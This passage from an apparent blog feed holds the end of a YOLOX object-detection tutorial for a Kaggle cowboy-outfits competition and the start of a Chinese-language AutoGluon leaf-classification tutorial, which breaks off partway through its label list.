YOLOX/datasets/COCO/annotations</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!ln -s /kaggle/<span class="built_in">input</span>/cowboy-outfits/images YOLOX/datasets/COCO/train2017</span><br><span class="line">!ln -s /kaggle/<span class="built_in">input</span>/cowboy-outfits/images YOLOX/datasets/COCO/val2017</span><br></pre></td></tr></table></figure><h2 id="Prepare-our-YOLOX-exp-amp-cococlasses"><a href="#Prepare-our-YOLOX-exp-amp-cococlasses" class="headerlink" title="Prepare our YOLOX exp &amp; cococlasses"></a>Prepare our YOLOX exp &amp; cococlasses</h2><ol><li>  Set your own exp, here use yolox_x</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">!echo &quot;        self.num_classes = 5&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py</span><br><span class="line">!echo &quot;        self.max_epoch = 50&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py</span><br><span class="line">!echo &quot;        self.eval_interval = 1&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py </span><br><span class="line">!echo &quot;        self.warmup_epochs = 2&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py</span><br><span class="line">#!echo &quot;        self.min_lr_ratio = 0.05&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py</span><br><span class="line">#!echo &quot;        self.data_num_workers = 0&quot; &gt;&gt; YOLOX/exps/default/yolox_x.py</span><br><span class="line"></span><br><span class="line">!cat YOLOX/exps/default/yolox_x.py</span><br></pre></td></tr></table></figure><ol start="2"><li>  Set coco_classes</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!echo <span class="string">&quot;COCO_CLASSES = (&#x27;belt&#x27;,&#x27;boot&#x27;,&#x27;cowboy_hat&#x27;,&#x27;jacket&#x27;,&#x27;sunglasses&#x27;)&quot;</span> &gt; <span class="string">&quot;YOLOX/yolox/data/datasets/coco_classes.py&quot;</span></span><br><span class="line">!cat YOLOX/yolox/data/datasets/coco_classes.py</span><br></pre></td></tr></table></figure><ol start="3"><li>  Download pre-trained models</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!wget https://github.com/Megvii-BaseDetection/storage/releases/download/<span class="number">0.0</span><span class="number">.1</span>/yolox_x.pth</span><br><span class="line">!mv yolox_x.pth yolox_x.pth.tar</span><br></pre></td></tr></table></figure><h2 id="Train-with-pre-trained-models"><a href="#Train-with-pre-trained-models" class="headerlink" title="Train with pre-trained models"></a>Train with pre-trained models</h2><p><code>!python YOLOX/tools/train.py -f YOLOX/exps/default/yolox_x.py -d 1 -b 4 --fp16 -o -c yolox_x.pth.tar</code></p><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p><code>!python YOLOX/tools/eval.py -f YOLOX/exps/default/yolox_x.py -c YOLOX_outputs/yolox_x/latest_ckpt.pth -b 4 -d 1 --conf 0.001 --fp16 --fuse</code></p><h2 id="Visualize-demo"><a href="#Visualize-demo" class="headerlink" title="Visualize demo"></a>Visualize demo</h2><p><code>!python YOLOX/tools/demo.py image -n yolox-x -c YOLOX_outputs/yolox_x/latest_ckpt.pth.tar --path ../input/cowboy-outfits/images/005b9630718c06c7.jpg --conf 0.25 --nms 0.45 --tsize 640 --save_result --device gpu</code></p><p><img src="https://z3.ax1x.com/2021/08/06/fuoySH.jpg" alt="visualize.jpg"></p><h2 id="Output-amp-Submit"><a href="#Output-amp-Submit" class="headerlink" title="Output &amp; Submit"></a>Output &amp; Submit</h2><ol><li>  Define the predict function to return output</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">pth,jpg</span>):</span></span><br><span class="line">    %cd YOLOX</span><br><span class="line">    <span class="keyword">from</span> yolox.exp <span class="keyword">import</span> get_exp</span><br><span class="line">    <span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">    <span class="keyword">from</span> yolox.utils <span class="keyword">import</span> fuse_model, get_model_info, postprocess, vis</span><br><span class="line">    <span class="keyword">from</span> yolox.data.data_augment <span class="keyword">import</span> preproc</span><br><span class="line">    <span class="keyword">import</span> torch,cv2</span><br><span class="line">    exp=get_exp(<span class="string">&#x27;exps/default/yolox_x.py&#x27;</span>,<span class="string">&#x27;yolox_x&#x27;</span>)</span><br><span class="line">    model = exp.get_model()</span><br><span class="line">    <span class="comment">#logger.info(&quot;Model Summary: &#123;&#125;&quot;.format(get_model_info(model, exp.test_size)))</span></span><br><span class="line">    model.cuda()</span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    ckpt_file=pth</span><br><span class="line">    ckpt = torch.load(ckpt_file, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">    model.load_state_dict(ckpt[<span class="string">&quot;model&quot;</span>])</span><br><span class="line">    model = fuse_model(model)</span><br><span class="line">    img = cv2.imread(jpg)</span><br><span class="line">    img, ratio = preproc(img, exp.test_size, (<span class="number">0.485</span>, <span class="number">0.456</span>, <span class="number">0.406</span>), (<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>)) <span class="comment"># test_size = (640, 640)</span></span><br><span class="line">    img = torch.from_numpy(img).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    img = img.cuda()</span><br><span class="line">    outputs = model(img)</span><br><span class="line">    <span class="comment">#outputs = postprocess(outputs, 5, exp.test_conf, exp.nmsthre) #test_conf = 0.01 nmsthre = 0.65</span></span><br><span class="line">    outputs = postprocess(outputs, <span class="number">5</span>, <span class="number">0.25</span> , <span class="number">0.45</span>)</span><br><span class="line">    output = outputs[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> output==<span class="literal">None</span>:</span><br><span class="line">        %cd ..</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line">    output = output.cpu()</span><br><span class="line">    bboxes = output[:, <span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    bboxes=bboxes/ratio</span><br><span class="line">    cls = output[:, <span class="number">6</span>]</span><br><span class="line">    scores = output[:, <span class="number">4</span>] * output[:, <span class="number">5</span>]</span><br><span class="line">    %cd ..</span><br><span class="line">    <span class="keyword">return</span> bboxes,cls,scores</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pth=<span class="string">&#x27;/kaggle/working/YOLOX_outputs/yolox_x/latest_ckpt.pth.tar&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yolox&#x27;s cls to dataset category_id</span></span><br><span class="line">categories=&#123;<span class="number">0</span>:<span class="number">87</span>,<span class="number">1</span>:<span class="number">131</span>,<span class="number">2</span>:<span class="number">318</span>,<span class="number">3</span>:<span class="number">588</span>,<span class="number">4</span>:<span class="number">1034</span>&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>  Use output and ‘valid.csv’/‘test.csv’ to return submissions</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_submission</span>(<span class="params">df,pth,score_thresh=<span class="number">0.1</span></span>):</span></span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> index, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">        img_id = row[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        file_name = row[<span class="string">&#x27;file_name&#x27;</span>]</span><br><span class="line">        img = Image.<span class="built_in">open</span>(file_name)</span><br><span class="line">        width, height = img.size</span><br><span class="line">        bboxes,cls,scores=predict(pth,file_name)</span><br><span class="line">        <span class="keyword">if</span> cls==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(scores):</span><br><span class="line">            <span class="keyword">if</span> p&gt; score_thresh:</span><br><span class="line">                roi = bboxes[i]</span><br><span class="line">                pred = &#123;<span class="string">&#x27;image_id&#x27;</span>: img_id,</span><br><span class="line">                        <span class="string">&#x27;category_id&#x27;</span>: categories[<span class="built_in">int</span>(cls[i])],</span><br><span class="line">                        <span class="string">&#x27;bbox&#x27;</span>: [<span class="built_in">float</span>(roi[<span class="number">0</span>]), <span class="built_in">float</span>(roi[<span class="number">1</span>]), <span class="built_in">float</span>(roi[<span class="number">2</span>]-roi[<span class="number">0</span>]), <span class="built_in">float</span>(roi[<span class="number">3</span>]-roi[<span class="number">1</span>])],  <span class="comment">#yolox bbox is xmin,ymin,xmax,ymax,submission is xmin,ymin,w,h</span></span><br><span class="line">                        <span class="string">&#x27;score&#x27;</span>: <span class="built_in">float</span>(p)&#125;</span><br><span class="line">                results.append(pred)</span><br><span class="line">        <span class="comment">#print(results)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%%capture</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">root = <span class="string">&#x27;/kaggle/input/cowboy-outfits&#x27;</span></span><br><span class="line">submission_df = pd.read_csv(<span class="string">&#x27;/kaggle/input/cowboy-outfits/valid.csv&#x27;</span>)  <span class="comment"># replace with test.csv on the last day</span></span><br><span class="line">submission_df[<span class="string">&#x27;file_name&#x27;</span>] = submission_df.apply(<span class="keyword">lambda</span> x: os.path.join(root, <span class="string">&#x27;images&#x27;</span>, x[<span class="string">&#x27;file_name&#x27;</span>]), axis=<span class="number">1</span>)</span><br><span class="line">submission = create_submission(submission_df, pth)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create json and zip</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">submission_name = <span class="string">&#x27;/kaggle/working/answer.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(submission_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(submission, f)</span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;/kaggle/working/sample_answer.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">zf.write(submission_name, <span class="string">&#x27;answer.json&#x27;</span>)</span><br><span class="line">zf.close()</span><br></pre></td></tr></table></figure><ol start="3"><li>  Visualize again (  Thanks <a href="https://www.kaggle.com/nekokiku">nekokiku </a> &amp; <a href="https://www.kaggle.com/snowclem">snow clem</a>,this part is using their code )</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"><span class="keyword">from</span> matplotlib.patches <span class="keyword">import</span> Rectangle </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xyxy_from_cowboy</span>(<span class="params">img_name, df, json_label</span>):</span></span><br><span class="line">    xy_list = []</span><br><span class="line">    fname_id_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">        fname_id_dict.update(&#123;row[<span class="string">&#x27;file_name&#x27;</span>]: row[<span class="string">&#x27;id&#x27;</span>]&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;len(valid)=&#x27;</span>, <span class="built_in">len</span>(fname_id_dict))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(json_label) <span class="keyword">as</span> f:</span><br><span class="line">        jdata = json.load(f)</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">dict</span> <span class="keyword">in</span> tqdm(jdata):</span><br><span class="line">            image_id = fname_id_dict[img_name]</span><br><span class="line">            <span class="keyword">if</span> image_id == <span class="built_in">dict</span>[<span class="string">&#x27;image_id&#x27;</span>]:</span><br><span class="line">                <span class="comment"># x_min, y_min, x_max, y_max = dict[&#x27;bbox&#x27;]</span></span><br><span class="line">                x, y, w, h = <span class="built_in">dict</span>[<span class="string">&#x27;bbox&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;category_id&#x27;</span>])</span><br><span class="line">                x_min, y_min, w, h = x, y,w,h</span><br><span class="line">                xy_list.append([<span class="built_in">int</span>(x_min), <span class="built_in">int</span>(y_min), <span class="built_in">int</span>(w), <span class="built_in">int</span>(h)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> xy_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_rect</span>(<span class="params">img, xy_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> xy <span class="keyword">in</span> xy_list:</span><br><span class="line">        <span class="comment">#cv2.rectangle(img, (xy[0], xy[1]), (xy[2], xy[3]), (0, 0, 255), 2)</span></span><br><span class="line">        <span class="built_in">print</span>(xy)</span><br><span class="line">        <span class="keyword">return</span> Rectangle((xy[<span class="number">0</span>],xy[<span class="number">1</span>]),xy[<span class="number">2</span>], xy[<span class="number">3</span>],fc =<span class="string">&#x27;none&#x27;</span>,ec =<span class="string">&#x27;r&#x27;</span>, lw =<span class="number">2</span>)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dataset_path = <span class="string">&#x27;../input/cowboy-outfits/images&#x27;</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;../input/cowboy-outfits/valid.csv&#x27;</span>)</span><br><span class="line">img_name = df[<span class="string">&#x27;file_name&#x27;</span>].sample(<span class="number">1</span>).tolist()[<span class="number">0</span>]</span><br><span class="line">json_label = <span class="string">r&#x27;answer.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#img_name=&#x27;d4ab52b2598b8f08.jpg&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(img_name)</span><br><span class="line">img = cv2.imread(os.path.join(dataset_path, img_name))</span><br><span class="line"><span class="built_in">print</span>(img.shape)  <span class="comment"># (h,w,c)</span></span><br><span class="line"></span><br><span class="line">xy_list = get_xyxy_from_cowboy(img_name, df, json_label)</span><br><span class="line">tmp=draw_rect(img, xy_list)</span><br><span class="line"></span><br><span class="line">fig = plt.figure() </span><br><span class="line">ax = fig.add_subplot() </span><br><span class="line">plt.imshow(img)</span><br><span class="line">ax.add_patch(tmp) </span><br></pre></td></tr></table></figure><h2 id="Score"><a href="#Score" class="headerlink" title="Score"></a>Score</h2><p><img src="https://z3.ax1x.com/2021/08/06/fu4ioF.png" alt="Score.png"></p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> YOLOX </tag>
            
            <tag> Object Detection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用AutoGluon，训练图片分类模型</title>
      <link href="/2021/06/25/%E4%BD%BF%E7%94%A8autogluon%EF%BC%8C%E8%AE%AD%E7%BB%83%E5%9B%BE%E7%89%87%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/06/25/%E4%BD%BF%E7%94%A8autogluon%EF%BC%8C%E8%AE%AD%E7%BB%83%E5%9B%BE%E7%89%87%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="使用AutoGluon，训练图片分类模型"><a href="#使用AutoGluon，训练图片分类模型" class="headerlink" title="使用AutoGluon，训练图片分类模型"></a>使用AutoGluon，训练图片分类模型</h1><p>此次主要使用AutoGluon，数据集为李沐老师在<a href="https://courses.d2l.ai/zh-v2/">动手学习深度学习</a>课程中卷积神经网络章节中的kaggle竞赛作业<a href="https://www.kaggle.com/c/classify-leaves">classify-leaves</a></p><h2 id="主要步骤如下："><a href="#主要步骤如下：" class="headerlink" title="主要步骤如下："></a>主要步骤如下：</h2><ol><li><p>使用autogluon的<a href="https://registry.hub.docker.com/r/autogluon/autogluon/tags?page=1&ordering=last_updated">docker镜像</a>搭建环境</p><ul><li>下载<a href="https://storage.googleapis.com/kaggle-competitions-data/kaggle-v2/29193/2318453/bundle/archive.zip?GoogleAccessId=web-data@kaggle-161607.iam.gserviceaccount.com&Expires=1624868108&Signature=QZT1LdYifGdDeQI5mL29peYD8EC3jvWb4sgwOALMsowdp6jFfnANl3lnOov7g9fWM8m6qEAx7BnabluiuIi7Ypop7ZJX9lKhQl6npzXh32xAzLbflTZMxBXkqOcxUUqO7TrUTIqAewG6fhe3yAOv+AaYNtGeYw3BsZbXbqKNWR3SjqcObxFeJWzqTnULfl5Cc3C3C29n6lMddOXzCyaHLLTCFTuSurxdVSuMu9r4txdTk9iPq8JgCNy5oMK+plHOs5VUMiiRmSj+bVU+J5eBmwn7arczZpVtv2IbyBGiwBoizVAC2t0rgLjDiW0LxF2Hd+76IhJOMwbdw1gclb88AA==&response-content-disposition=attachment;+filename=classify-leaves.zip">数据集</a>至本地，此处放在<code>/home/x/ENV/pytorch</code>下</li><li>使用AutoGluon docker容器<br><code>sudo docker run --runtime=nvidia -it --name=&#39;pytorch&#39; -p 8888:8888 -e LANG=&quot;C.UTF-8&quot; -v /home/x/ENV/pytorch:/workspace/mycode autogluon/autogluon:0.2.0-rapids0.19-cuda10.2-jupyter-ubuntu18.04-py3.7 /bin/bash</code></li><li>安装vim(编辑jupyter配置文件)<br><code>apt-get install vim</code></li><li>配置jupyter远程访问<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br><span class="line">vim ~/.jupyter/jupyter_notebook_config.py</span><br><span class="line">c.NotebookApp.ip=&#x27;*&#x27;</span><br></pre></td></tr></table></figure></li><li>启用jupyter_notebook<br><code>jupyter notebook --allow-root</code></li></ul></li><li><p>具体训练模型代码如下：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">import</span> autogluon.core <span class="keyword">as</span> ag</span><br><span class="line"><span class="keyword">from</span> autogluon.vision <span class="keyword">import</span> ImagePredictor</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#已将数据集放在/train_valid_test/下，分为train,train_valid和test</span></span><br><span class="line">train_dataset = ImagePredictor.Dataset.from_folder(<span class="string">&#x27;./data/train_valid_test/train_valid/&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(train_dataset)</span><br><span class="line">model_list = ImagePredictor.list_models()</span><br><span class="line"><span class="comment">#查看ImagePredictor提供的model</span></span><br><span class="line"><span class="built_in">print</span>(model_list)</span><br><span class="line"></span><br><span class="line"><span class="comment">#电脑性能不行，自选部分超参数</span></span><br><span class="line"><span class="comment">#model = ag.Categorical(&#x27;resnet50_v2&#x27;, &#x27;mobilenetv3_small&#x27;)</span></span><br><span class="line">batch_size=<span class="number">6</span></span><br><span class="line">epochs= <span class="number">200</span></span><br><span class="line"><span class="comment">#hyperparameters=&#123;&#x27;model&#x27;: model, &#x27;batch_size&#x27;: batch_size,&#x27;epochs&#x27;:epochs&#125;</span></span><br><span class="line">hyperparameters=&#123;<span class="string">&#x27;batch_size&#x27;</span>: batch_size,<span class="string">&#x27;epochs&#x27;</span>:epochs&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置时间限制</span></span><br><span class="line">time_limit = <span class="number">72</span>* <span class="number">60</span> * <span class="number">60</span></span><br><span class="line">predictor = ImagePredictor()</span><br><span class="line">predictor.fit(train_dataset, hyperparameters=hyperparameters)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Top-1 val acc: %.3f&#x27;</span> % predictor.fit_summary()[<span class="string">&#x27;valid_acc&#x27;</span>])</span><br><span class="line"></span><br><span class="line">test_dataset = ImagePredictor.Dataset.from_folder(<span class="string">&#x27;./data/train_valid_test/test/&#x27;</span>)</span><br><span class="line">pred = predictor.predict(test_dataset)</span><br><span class="line"><span class="built_in">print</span>(pred)</span><br><span class="line">ag.utils.generate_csv(pred.tolist(), <span class="string">&#x27;./submission.csv&#x27;</span>)</span><br><span class="line">label_list=[<span class="string">&#x27;abies_concolor&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;abies_nordmanniana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_campestre&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_ginnala&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_griseum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_negundo&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_palmatum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_pensylvanicum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_platanoides&#x27;</span>,</span><br><span class="line"><span 